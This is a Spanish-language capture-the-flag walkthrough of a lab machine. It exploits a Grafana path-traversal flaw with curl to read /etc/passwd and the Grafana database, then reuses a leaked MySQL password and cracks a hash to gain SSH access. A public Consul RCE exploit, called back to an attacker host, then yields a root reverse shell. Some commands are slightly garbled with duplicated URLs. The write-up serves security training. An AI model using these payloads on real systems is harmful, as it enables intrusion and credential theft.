<html><head></head><body><h1>Summary</h1>
<ul>
<li>IP: 10.10.11.183</li>
<li>Ports: 22,80,3000,3306</li>
<li>OS: Linux (Ubuntu)</li>
<li>Services &amp; Applications:
<ul>
<li>22 -&gt; OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</li>
<li>80 -&gt; Apache httpd 2.4.41</li>
<li>3000 -&gt; ppp?</li>
<li>3306 -&gt; MySQL 8.0.30-0ubuntu0.20.04.2</li>
</ul>
</li>
</ul>
<h1>Recon</h1>
<ul>
<li>Reconocimiento básico de puertos:</li>
</ul>
<pre><code>$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
</code></pre>
<ul>
<li>Reconocimiento profundo de puertos encontrados:</li>
</ul>
<pre><code>$sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.116.216 -oN targeted
</code></pre>
<ul>
<li>Búsqueda de directorios, pero no encontramos nada interesante; analizamos la web y tampoco hay nada relevante.</li>
<li>Analizamos la web en el puerto 3000 y vemos un login de "Grafana", buscamos vulnerabilidades y encontramos una script en python la cual permite un LFI, analizamos el código y ejecutamos mediante un curl la parte que nos permite ejecutar el LFI:</li>
</ul>
<pre><code>#curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwdhttp://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd | grep sh
</code></pre>
<ul>
<li>Confirmamos el LFI y hacemos una búsqueda básica de posibles vectores de ataque; intentamos descargar la base de datos que está por detrás de grafana usando el siguiente recurso:</li>
</ul>
<pre><code>#curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.dbhttp://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
</code></pre>
<ul>
<li>Abrimos el archivo ".db" con "sqlitebrowser" y analizamos la base de datos; vemos una tabla llamada "data-source", le hacemos un "table browse" y encontramos el usuario y contraseña para acceder a la base de datos de "grafana", lo hacemos:</li>
</ul>
<pre><code>#mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!
</code></pre>
<ul>
<li>Buscamos información relevante:</li>
</ul>
<pre><code>show databes;
use whackywidget;
show tables;
select * from users;
</code></pre>
<ul>
<li>Encontramos el usuario "developer" con un hash, lo crackeamos en <a href="http://www.hashes.com/">www.hashes.com</a> y accedemos por SSH como "developer", y encontramos la primera flag.</li>
</ul>
<h1>ESCALANDO PRIVILEGIOS:</h1>
<ul>
<li>
<p>Haciendo una búsqueda típica, no encontramos nada que pueda usarse para escalar privilegios, así que buscamos de forma más rigurosa.</p>
</li>
<li>
<p>En el directorio "/opt" encontramos una posible aplicación desarrollada en git llamada "my-app", entramos y buscamos archivos ocultos.</p>
</li>
<li>
<p>Vemos un ".git" por lo que confirmamos que se trata de un desarrollo para github, ejecutamos el comando siguiente para verificar el log:</p>
</li>
</ul>
<p>git log</p>
<ul>
<li>Vemos varios commits, analizamos el primero con:</li>
</ul>
<pre><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
</code></pre>
<ul>
<li>
<p>Podemos ver un código en el que se involucra la función "consul" y un token que podríamos aprovechar ya que con un "ls -l" podemos ver que todo este aplicativo está gestionado por root; buscamos exploits para aprovechar esta función consul y encontramos el siguiente: <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API">GatoGamer1155/Hashicorp-Consul-RCE-via-API: Exploit of RCE for gain reverse shell (bash) in Hashicorp Consul on Remote Command Execution via API (github.com)</a></p>
</li>
<li>
<p>Descargamos el exploit, lo pasamos a la máquina víctima, y lo ejecutamos poniéndonos en escucha en la máquina atacante:</p>
</li>
</ul>
<pre><code>$ python3 exploit.py --lhost 10.10.14.30 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
</code></pre>
<ul>
<li>Accedemos a una shell como root y vemos la última flag.</li>
</ul>
</body></html>